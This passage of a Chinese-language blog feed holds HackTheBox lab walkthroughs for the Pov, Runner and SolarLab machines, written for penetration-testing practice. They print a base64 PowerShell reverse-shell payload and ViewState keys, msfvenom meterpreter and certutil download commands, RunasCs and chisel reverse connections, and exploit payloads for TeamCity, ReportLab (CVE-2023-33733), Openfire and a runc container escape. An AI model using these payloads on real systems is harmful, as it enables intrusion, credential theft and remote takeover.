ADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==&quot; --apppath=&quot;/&quot; --path=&quot;/portfolio/default.aspx&quot; --decryptionalg=&quot;AES&quot; --decryptionkey=&quot;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&quot; --validationalg=&quot;SHA1&quot; --validationkey=&quot;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&quot;</span><br></pre></td></tr></table></figure>

<p>成功反弹shell</p>
<p><img src="/article/Pov-HackTheBox/image-20240405194432185.png"></p>
<p>经过一番查找在<code>C:\Users\sfitz\Documents</code>路径下发现有用信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Objs Version=&quot;1.1.0.1&quot; xmlns=&quot;http://schemas.microsoft.com/powershell/2004/04&quot;&gt;</span><br><span class="line">  &lt;Obj RefId=&quot;0&quot;&gt;</span><br><span class="line">    &lt;TN RefId=&quot;0&quot;&gt;</span><br><span class="line">      &lt;T&gt;System.Management.Automation.PSCredential&lt;/T&gt;</span><br><span class="line">      &lt;T&gt;System.Object&lt;/T&gt;</span><br><span class="line">    &lt;/TN&gt;</span><br><span class="line">    &lt;ToString&gt;System.Management.Automation.PSCredential&lt;/ToString&gt;</span><br><span class="line">    &lt;Props&gt;</span><br><span class="line">      &lt;S N=&quot;UserName&quot;&gt;alaading&lt;/S&gt;</span><br><span class="line">      &lt;SS N=&quot;Password&quot;&gt;01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6&lt;/SS&gt;</span><br><span class="line">    &lt;/Props&gt;</span><br><span class="line">  &lt;/Obj&gt;</span><br><span class="line">&lt;/Objs&gt;</span><br></pre></td></tr></table></figure>

<p>利用powershell语法解密将password转换成明文 <a href="https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters#secure-string-to-plaintext">参考文章</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$cred = Import-CliXml -Path connection.xml; $cred.GetNetworkCredential() | Format-List *</span><br></pre></td></tr></table></figure>

<p>成功得到密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\sfitz\Documents&gt; $cred = Import-CliXml -Path connection.xml; $cred.GetNetworkCredential() | Format-List *</span><br><span class="line">UserName       : alaading</span><br><span class="line">Password       : f8gQ8fynP44ek1m3</span><br><span class="line">SecurePassword : System.Security.SecureString</span><br><span class="line">Domain         : </span><br></pre></td></tr></table></figure>

<p>接下来我们使用RunasCs进行用户切换</p>
<p>首先切换到Downloads目录，然后下载本地的RunasCs文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://10.10.14.46/RunasCs.exe</span><br></pre></td></tr></table></figure>

<p><img src="/article/Pov-HackTheBox/image-20240405200822175.png"></p>
<p>然后切换用户并弹shell到777端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./RunasCs.exe alaading f8gQ8fynP44ek1m3 powershell.exe -r 10.10.14.46:777</span><br></pre></td></tr></table></figure>

<p>重点：这里用<code>powershell</code>弹，如果用<code>cmd.exe</code>到后面会发现没有<code>SeDebugPrivilege</code>权限</p>
<p><img src="/article/Pov-HackTheBox/image-20240405200949897.png"></p>
<p>得到user的flag</p>
<p><img src="/article/Pov-HackTheBox/image-20240405201600635.png"></p>
<p>查看下当前用户权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Windows\system32&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State   </span><br><span class="line">============================= ============================== ========</span><br><span class="line">SeDebugPrivilege              Debug programs                 Enabled </span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled </span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set Disabled</span><br></pre></td></tr></table></figure>

<p><strong>SeDebugPrivilege</strong></p>
<blockquote>
<p>在Windows操作系统中，SeDebugPrivilege是一种特别强大的权限，可以让持有该权限的进程读取或修改几乎所有其他进程的内存空间，即使是那些以系统或管理员级别运行的进程。在Metasploit框架下，拥有了这个权限，就可以对系统的SAM数据库进行读取</p>
</blockquote>
<p>由于靶机<code>SeDebugPrivilege</code>是<code>enabled</code>，所以我们就直接提权就行了</p>
<p>若要启动该权限，需要执行下面脚本 <a href="https://book.hacktricks.xyz/v/cn/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens#qi-yong-suo-you-ling-pai">参考文章</a></p>
<p>EnableAllTokenPrivs.ps1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## All Credit goes to Lee Holmes (@Lee_Holmes on twitter).  I found the code here https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/</span><br><span class="line">$definition = @&#x27;</span><br><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line"></span><br><span class="line">namespace Set_TokenPermission</span><br><span class="line">&#123;</span><br><span class="line">    public class SetTokenPriv</span><br><span class="line">    &#123;</span><br><span class="line">        [DllImport(&quot;advapi32.dll&quot;, ExactSpelling = true, SetLastError = true)]</span><br><span class="line">        internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall,</span><br><span class="line">        ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);</span><br><span class="line">        [DllImport(&quot;advapi32.dll&quot;, ExactSpelling = true, SetLastError = true)]</span><br><span class="line">        internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);</span><br><span class="line">        [DllImport(&quot;advapi32.dll&quot;, SetLastError = true)]</span><br><span class="line">        internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);</span><br><span class="line">        [StructLayout(LayoutKind.Sequential, Pack = 1)]</span><br><span class="line">        internal struct TokPriv1Luid</span><br><span class="line">        &#123;</span><br><span class="line">            public int Count;</span><br><span class="line">            public long Luid;</span><br><span class="line">            public int Attr;</span><br><span class="line">        &#125;</span><br><span class="line">        internal const int SE_PRIVILEGE_ENABLED = 0x00000002;</span><br><span class="line">        internal const int SE_PRIVILEGE_DISABLED = 0x00000000;</span><br><span class="line">        internal const int TOKEN_QUERY = 0x00000008;</span><br><span class="line">        internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;</span><br><span class="line">        public static void EnablePrivilege()</span><br><span class="line">        &#123;</span><br><span class="line">            bool retVal;</span><br><span class="line">            TokPriv1Luid tp;</span><br><span class="line">            IntPtr hproc = new IntPtr();</span><br><span class="line">            hproc = Process.GetCurrentProcess().Handle;</span><br><span class="line">            IntPtr htok = IntPtr.Zero;</span><br><span class="line"></span><br><span class="line">            List&lt;string&gt; privs = new List&lt;string&gt;() &#123;  &quot;SeAssignPrimaryTokenPrivilege&quot;, &quot;SeAuditPrivilege&quot;, &quot;SeBackupPrivilege&quot;,</span><br><span class="line">            &quot;SeChangeNotifyPrivilege&quot;, &quot;SeCreateGlobalPrivilege&quot;, &quot;SeCreatePagefilePrivilege&quot;,</span><br><span class="line">            &quot;SeCreatePermanentPrivilege&quot;, &quot;SeCreateSymbolicLinkPrivilege&quot;, &quot;SeCreateTokenPrivilege&quot;,</span><br><span class="line">            &quot;SeDebugPrivilege&quot;, &quot;SeEnableDelegationPrivilege&quot;, &quot;SeImpersonatePrivilege&quot;, &quot;SeIncreaseBasePriorityPrivilege&quot;,</span><br><span class="line">            &quot;SeIncreaseQuotaPrivilege&quot;, &quot;SeIncreaseWorkingSetPrivilege&quot;, &quot;SeLoadDriverPrivilege&quot;,</span><br><span class="line">            &quot;SeLockMemoryPrivilege&quot;, &quot;SeMachineAccountPrivilege&quot;, &quot;SeManageVolumePrivilege&quot;,</span><br><span class="line">            &quot;SeProfileSingleProcessPrivilege&quot;, &quot;SeRelabelPrivilege&quot;, &quot;SeRemoteShutdownPrivilege&quot;,</span><br><span class="line">            &quot;SeRestorePrivilege&quot;, &quot;SeSecurityPrivilege&quot;, &quot;SeShutdownPrivilege&quot;, &quot;SeSyncAgentPrivilege&quot;,</span><br><span class="line">            &quot;SeSystemEnvironmentPrivilege&quot;, &quot;SeSystemProfilePrivilege&quot;, &quot;SeSystemtimePrivilege&quot;,</span><br><span class="line">            &quot;SeTakeOwnershipPrivilege&quot;, &quot;SeTcbPrivilege&quot;, &quot;SeTimeZonePrivilege&quot;, &quot;SeTrustedCredManAccessPrivilege&quot;,</span><br><span class="line">            &quot;SeUndockPrivilege&quot;, &quot;SeUnsolicitedInputPrivilege&quot;, &quot;SeDelegateSessionUserImpersonatePrivilege&quot; &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">            retVal = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);</span><br><span class="line">            tp.Count = 1;</span><br><span class="line">            tp.Luid = 0;</span><br><span class="line">            tp.Attr = SE_PRIVILEGE_ENABLED;</span><br><span class="line"></span><br><span class="line">            foreach (var priv in privs)</span><br><span class="line">            &#123;</span><br><span class="line">                retVal = LookupPrivilegeValue(null, priv, ref tp.Luid);</span><br><span class="line">                retVal = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);                              </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line">&#x27;@</span><br><span class="line"></span><br><span class="line">$type = Add-Type $definition -PassThru</span><br><span class="line">$type[0]::EnablePrivilege() 2&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>在本地开启http服务上传该脚本文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://10.10.14.46/EnableAllTokenPrivs.ps1</span><br></pre></td></tr></table></figure>

<p>然后<code>.\EnableAllTokenPrivs.ps1</code>即可</p>
<p>回到题目，我们利用msf先在本地生成马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.46 LPORT=5555 -f exe &gt; exploit.exe</span><br></pre></td></tr></table></figure>

<p>然后本地开启http服务，上传到靶机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil -urlcache -split -f http://10.10.14.46/exploit.exe</span><br></pre></td></tr></table></figure>

<p><img src="/article/Pov-HackTheBox/image-20240405203424722.png"></p>
<p>在本地启动一个msf数据库&amp;console</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo msfdb init &amp;&amp; msfconsole</span><br></pre></td></tr></table></figure>

<p>接着依次执行去反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 10.10.14.46</span><br><span class="line">set LPORT 5555</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>开启监听后在靶机运行<code>.\exploit.exe</code>，反弹成功</p>
<p><img src="/article/Pov-HackTheBox/image-20240406124840953.png"></p>
<p>我们<code>ps</code>查看下靶机正在运行的进程，注意到<code>winlogon.exe</code>文件</p>
<blockquote>
<p>winlogon.exe 是 Windows 的登录系统进程，它在用户登录时启动，并处理用户登录和注销的过程。当用户输入用户名和密码后，winlogon.exe 验证用户的凭据，并启动用户环境。它还负责加载用户配置文件、启动用户的用户界面和其他关联的系统任务。</p>
</blockquote>
<p><img src="/article/Pov-HackTheBox/image-20240406125030326.png"></p>
<p>然后使用<code>migrate 548</code>命令将shell移到winlogon.exe进程里</p>
<p>执行shell命令，成功提权拿到flag</p>
<p><img src="/article/Pov-HackTheBox/image-20240406125219057.png"></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>HackTheBox</tag>
        <tag>Windows</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>Runner</title>
    <url>/article/Runner-HackTheBox.html</url>
    <content><![CDATA[<p>JetBrains TeamCity 身份验证绕过漏洞、runC 逃逸漏洞</p>
<span id="more"></span>

<h1 id="Runner"><a href="#Runner" class="headerlink" title="Runner"></a>Runner</h1><p><strong>信息搜集</strong></p>
<p>nmap扫描端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -v 10.10.11.13</span><br></pre></td></tr></table></figure>

<p>扫描结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open  http        nginx 1.18.0 (Ubuntu)</span><br><span class="line">8000/tcp open  nagios-nsca Nagios NSCA</span><br></pre></td></tr></table></figure>

<p>访问80端口发现重定向，添加到<code>/etc/hosts</code>后成功访问</p>
<p>一番搜索没什么东西，扫一下目录和子域名</p>
<p><img src="/article/Runner-HackTheBox/image-20240518224235291.png"></p>
<p>发现状态码为401，将该子域名添加到hosts文件，访问是登陆界面</p>
<p><img src="/article/Runner-HackTheBox/image-20240518224323364.png"></p>
<p>扫一下目录</p>
<p><img src="/article/Runner-HackTheBox/image-20240518225531291.png"></p>
<p>当我们访问<code>/404.html</code>的时候发现是JetBrains</p>
<p><img src="/article/Runner-HackTheBox/image-20240518225615781.png"></p>
<p>由于是登陆界面，去网上找到篇文章是关于JetBrains TeamCity身份验证绕过的漏洞 <a href="https://forum.butian.net/share/2801">文章链接</a></p>
<p>这里就不进行分析了，直接按照文章打exp</p>
<p>获取用户列表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/xxx?jsp=/app/rest/users;.jsp</span><br></pre></td></tr></table></figure>

<p><img src="/article/Runner-HackTheBox/image-20240518230831965.png"></p>
<p>可以看到存在四个用户</p>
<p>我们添加管理员用户，payload如下（注意解析json数据）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;: &quot;test&quot;, &quot;password&quot;: &quot;test&quot;, &quot;email&quot;: &quot;test@qq.com&quot;, &quot;roles&quot;: &#123;&quot;role&quot;: [&#123;&quot;roleId&quot;: &quot;SYSTEM_ADMIN&quot;, &quot;scope&quot;: &quot;g&quot;&#125;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/article/Runner-HackTheBox/image-20240518231558874.png"></p>
<p>我们再查看下用户列表，发现添加test用户成功</p>
<p><img src="/article/Runner-HackTheBox/image-20240518231657492.png"></p>
<p>看漏洞是说有两种可以getshell，一种是上传插件另外一种是利用token绕过权限命令执行</p>
<p>测试一下都没成功，正确解法是管理界面存在备份文件</p>
<p><img src="/article/Runner-HackTheBox/image-20240519231605539.png"></p>
<p>下载下来后，在users文件找到用户及密码</p>
<p><img src="/article/Runner-HackTheBox/image-20240519231756558.png"></p>
<p>john的密码爆破要很久，成功爆破用户matthew的密码<code>piper123</code></p>
<p>不过这里</p>
<p><img src="/article/Runner-HackTheBox/image-20240520201810126.png"></p>
<p>我们继续去找私钥文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep -rnw . -e &quot;BEGIN OPENSSH PRIVATE KEY&quot;</span><br></pre></td></tr></table></figure>

<p>得到文件路径<code>./config/projects/AllProjects/pluginData/ssh_keys/id_rsa</code></p>
<p>我们使用cp命令放到我们当前文件夹，尝试ssh登陆发现刚好就是john的私钥文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i id_rsa john@10.10.11.13</span><br></pre></td></tr></table></figure>

<p>拿到user的flag，由于不知道john的密码，无法用sudo提权</p>
<p>只能分析一下网络连接的端口情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -nltp</span><br></pre></td></tr></table></figure>

<p><img src="/article/Runner-HackTheBox/image-20240520202711385.png"></p>
<p>这里注意到9000端口是开放的，使用工具chisel搭建隧道把目标9000端口映射到本地</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本机：./chisel server -p 6150 --reverse</span><br><span class="line">靶机：./chisel client 10.10.14.60:6150 R:9000:127.0.0.1:9000  #R表示反向隧道</span><br></pre></td></tr></table></figure>

<p>在本机开启监听6150端口，并执行反向连接，然后靶机主动去监听ip为10.10.14.60的本机并将9000端口映射到本机9000端口</p>
<p>首先在本地开启http服务，然后传上去chisel</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.10.14.60:777/chisel</span><br></pre></td></tr></table></figure>

<p><img src="/article/Runner-HackTheBox/image-20240520204727134.png"></p>
<p>然后就是在本机开启监听后，靶机上执行命令即可搭建隧道</p>
<p>注意两个点</p>
<ul>
<li>第一就是本机kali上pip安装的和我们传上去的chisel版本会不一致，所以传哪个本机上就用哪个</li>
<li>第二就是记得赋予可执行权限给chisel</li>
</ul>
<p><img src="/article/Runner-HackTheBox/image-20240520210045416.png"></p>
<p>搭建隧道成功后访问本地9000端口，发现是登陆界面</p>
<p>我们拿刚刚爆破得到的用户密码成功登陆</p>
<p><img src="/article/Runner-HackTheBox/image-20240520211026329.png"></p>
<p>是个管理容器的平台，点击容器查看docker版本为25.03，对应runc版本1.0.0-rc93</p>
<p><img src="/article/Runner-HackTheBox/image-20240520212110157.png"></p>
<p>此版本的runc存在容器逃逸漏洞 <a href="https://nitroc.org/posts/cve-2024-21626-illustrated/">参考文章</a></p>
<p>根据参考文章，攻击者可通过以下两种方式利用该漏洞：</p>
<ul>
<li>启动一个容器时将容器的工作目录设置为<code>/proc/self/fd/&lt;fd&gt;</code>（<code>&lt;fd&gt;</code>为打开 &#x2F;sys&#x2F;fs&#x2F;cgroup 目录时返回的文件描述符，一般情况下为 7 或 8）。</li>
<li>在容器中为<code>/proc/self/fd/&lt;fd&gt;</code>（<code>&lt;fd&gt;</code> 为打开<code>/sys/fs/cgroup</code>目录时返回的文件描述符，一般情况下为 7 或 8） 创建一个符号链接。当外部在该容器中执行命令时，容器中可通过<code>/proc/&lt;PID&gt;/cwd</code>符号链接访问宿主机文件系统中的<code>/sys/fs/cgroup</code>目录，并利用形如<code>/proc/&lt;PID&gt;/cwd/../../../</code>的路径访问宿主机文件系统。</li>
</ul>
<p>我们先添加新的volume</p>
<p><img src="/article/Runner-HackTheBox/image-20240520221407006.png"></p>
<p>然后创建新容器</p>
<p><img src="/article/Runner-HackTheBox/image-20240520221850313.png"></p>
<p>修改工作目录</p>
<p><img src="/article/Runner-HackTheBox/image-20240520221608215.png"></p>
<p>注意要设置volume</p>
<p><img src="/article/Runner-HackTheBox/image-20240520221701687.png"></p>
<p>创建好后，进入控制台填上root去连接</p>
<p>成功得到root的flag</p>
<p><img src="/article/Runner-HackTheBox/image-20240520220836933.png"></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>HackTheBox</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>SolarLab</title>
    <url>/article/SolarLab-HackTheBox.html</url>
    <content><![CDATA[<p>SMB共享文件获取敏感信息、Python Reportlab 代码注入漏洞、Openfire身份认证绕过漏洞</p>
<span id="more"></span>

<h1 id="SolarLab"><a href="#SolarLab" class="headerlink" title="SolarLab"></a>SolarLab</h1><p><strong>信息搜集</strong></p>
<p>nmap扫描端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -v 10.10.11.16</span><br></pre></td></tr></table></figure>

<p>扫描结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT    STATE SERVICE       VERSION</span><br><span class="line">80/tcp  open  http          nginx 1.24.0</span><br><span class="line">135/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds?</span><br></pre></td></tr></table></figure>

<p>观察到445端口开放存在Microsoft-DS服务，用smb查看一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient -L 10.10.11.16</span><br></pre></td></tr></table></figure>

<p><img src="/article/SolarLab-HackTheBox/image-20240602104226917.png"></p>
<p>用Documents登录一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient \\\\10.10.11.16\\Documents</span><br></pre></td></tr></table></figure>

<p>我们注意到有个xlsx表格文件，使用get命令下载下来</p>
<p><img src="/article/SolarLab-HackTheBox/image-20240602114836534.png"></p>
<p>打开看看发现有用户信息，应该能利用登录</p>
<p><img src="/article/SolarLab-HackTheBox/image-20240602114912532.png"></p>
<p>访问80端口发现跳转域名，添加到hosts文件即可</p>
<p>不过在扫描子域名以及目录后没有收获，尝试重新使用nmap扫描全部端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">80/tcp   open  http          nginx 1.24.0</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">6791/tcp open  http          nginx 1.24.0</span><br></pre></td></tr></table></figure>

<p>还存在6791端口，访问发现跳转直接添加hosts文件即可</p>
<p><img src="/article/SolarLab-HackTheBox/image-20240602200358108.png"></p>
<p>回到刚刚得到的用户信息，初步测试发现只有用户名为<code>AlexanderK</code>和<code>ClaudiaS</code>存在，并且使用密码登陆不成功</p>
<p>但是我们注意到表格左上方有三个用户，其中<code>Blake</code>引起我们注意。并且用户登录的用户名的尾部是大写字母，我们尝试对其爆破出用户<code>Blake</code>的登录username</p>
<p><img src="/article/SolarLab-HackTheBox/image-20240602202614214.png"></p>
<p>成功登录</p>
<p><img src="/article/SolarLab-HackTheBox/image-20240602202809085.png"></p>
<p>大概翻了一下是和生成pdf文件有关，搜索一下ReportHub</p>
<p>得知reportlab是一个用于生成PDF和图形的Python库，并且存在Python Reportlab 代码注入漏洞(CVE-2023-33733)</p>
<p><img src="/article/SolarLab-HackTheBox/image-20240602203427577.png"></p>
<p>github上有写好的poc <a href="https://github.com/c53elyas/CVE-2023-33733/blob/master/code-injection-poc/poc.py">脚本链接</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;para&gt;</span><br><span class="line">              &lt;font color=&quot;[ [ getattr(pow,Word(&#x27;__globals__&#x27;))[&#x27;os&#x27;].system(&#x27;whoami&#x27;) for Word in [orgTypeFun(&#x27;Word&#x27;, (str,), &#123; &#x27;mutated&#x27;: 1, &#x27;startswith&#x27;: lambda self, x: False, &#x27;__eq__&#x27;: lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#x27;mutate&#x27;: lambda self: &#123;setattr(self, &#x27;mutated&#x27;, self.mutated - 1)&#125;, &#x27;__hash__&#x27;: lambda self: hash(str(self)) &#125;)] ] for orgTypeFun in [type(type(1))] ] and &#x27;red&#x27;&quot;&gt;</span><br><span class="line">                exploit</span><br><span class="line">                &lt;/font&gt;</span><br><span class="line">            &lt;/para&gt;</span><br></pre></td></tr></table></figure>

<p>修改一下脚本中执行的命令为反弹shell，测试发现是windows系统，用在线网站生成powershell版本的shell <a href="https://zgao.top/reverse-shell/">网站链接</a></p>
<p><img src="/article/SolarLab-HackTheBox/image-20240602204812175.png"></p>
<p>随便选个request请求，抓包添加payload到<code>training_request</code>参数</p>
<p>成功反弹shell</p>
<p><img src="/article/SolarLab-HackTheBox/image-20240602205810553.png"></p>
<p>在<code>C:\Users\blake\Desktop</code>找到user的flag</p>
<p>大概翻了一下没有什么可以利用的，我们查看下连接的端口情况</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure>

<p>与常见端口漏洞利用对比，发现存在9090端口</p>
<p><img src="/article/SolarLab-HackTheBox/image-20240602213138305.png"></p>
<p>我们利用chisel进行端口转发，把9090端口转发到我们本机</p>
<p>（注意这里传的是windows版本的chisel，并且要用curl不知道wget为什么不行）</p>
<p>在本地开启http服务，用curl去传</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://10.10.14.88/chisel.exe -o chisel.exe</span><br></pre></td></tr></table></figure>

<p><img src="/article/SolarLab-HackTheBox/image-20240602214407604.png"></p>
<p>进行隧道搭建</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本机：./chisel server -p 6150 --reverse</span><br><span class="line">靶机：./chisel.exe client 10.10.14.88:6150 R:9090:127.0.0.1:9090  #R表示反向隧道</span><br></pre></td></tr></table></figure>

<p>访问<code>127.0.0.1:9090</code>，发现是版本为4.7.4的openfire</p>
<p><img src="/article/SolarLab-HackTheBox/image-20240602215037905.png"></p>
<p>去阿里云漏洞库搜一下，找到Openfire身份认证绕过漏洞(CVE-2023-32315)</p>
<p><img src="/article/SolarLab-HackTheBox/image-20240602215156989.png"></p>
<p>我们验证一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:9090/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp</span><br></pre></td></tr></table></figure>

<p>成功访问日志</p>
<p><img src="/article/SolarLab-HackTheBox/image-20240602215809073.png"></p>
<p>我们思路就是<strong>未授权</strong>创建管理员用户 <a href="https://zhuanlan.zhihu.com/p/675189543">参考文章</a></p>
<p>首先获取<code>JSESSIONID</code>和<code>csrf</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:9090/setup/setup-s/%u002e%u002e/%u002e%u002e/user-groups.jsp</span><br></pre></td></tr></table></figure>

<p><img src="/article/SolarLab-HackTheBox/image-20240602220318246.png"></p>
<p>使用获取到<code>JSESSIONID</code>和<code>csrf</code>创建用户<code>re1v1ve/rev1ve</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=SM0rG58cmPWkkiR&amp;username=rev1ve&amp;name=&amp;email=&amp;password=rev1ve&amp;passwordConfirm=admin123&amp;isadmin=on&amp;create=Create+User HTTP/1.1</span><br><span class="line">Host: x.x.x.x:9090</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US;q=0.9,en;q=0.8</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Cookie: JSESSIONID=node015oa6y9775tb54z36d9l36h8b7.node0;csrf=hXgFWkHO1HyB6Rb</span><br></pre></td></tr></table></figure>

<p><img src="/article/SolarLab-HackTheBox/image-20240602220512260.png"></p>
<p>不过抛出异常了，还可以用github上的工具创建</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd CVE-2023-32315-Openfire-Bypass/scan_all</span><br><span class="line">go mod tidy</span><br><span class="line">go run main.go -u http://10.10.14.88:9090</span><br></pre></td></tr></table></figure>

<p><img src="/article/SolarLab-HackTheBox/image-20240602224001586.png"></p>
<p>成功登录</p>
<p><img src="/article/SolarLab-HackTheBox/image-20240602224737039.png"></p>
<p>上传插件 <a href="https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass/releases/tag/v0.1">插件链接</a></p>
<p>在<code>server =&gt; server settings</code>功能处发现发现<code>shell Plugins</code></p>
<p>按照上传插件的描述<code>pass 123</code>用密码123登录，找到命令执行界面</p>
<p><img src="/article/SolarLab-HackTheBox/image-20240602225153411.png"></p>
<p>还是用powershell去弹shell</p>
<p><img src="/article/SolarLab-HackTheBox/image-20240602225847251.png"></p>
<p>在<code>C:\Program Files\Openfire\embedded-db</code>发现<code>openfire.script</code>文件</p>
<p>查看一下，发现插入的和admin有关数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO OFUSER VALUES(&#x27;admin&#x27;,&#x27;gjMoswpK+HakPdvLIvp6eLKlYh0=&#x27;,&#x27;9MwNQcJ9bF4YeyZDdns5gvXp620=&#x27;,&#x27;yidQk5Skw11QJWTBAloAb28lYHftqa0x&#x27;,4096,NULL,&#x27;becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442&#x27;,&#x27;Administrator&#x27;,&#x27;admin@solarlab.htb&#x27;,&#x27;001700223740785&#x27;,&#x27;0&#x27;)</span><br></pre></td></tr></table></figure>

<p>再看下对应表的键名</p>
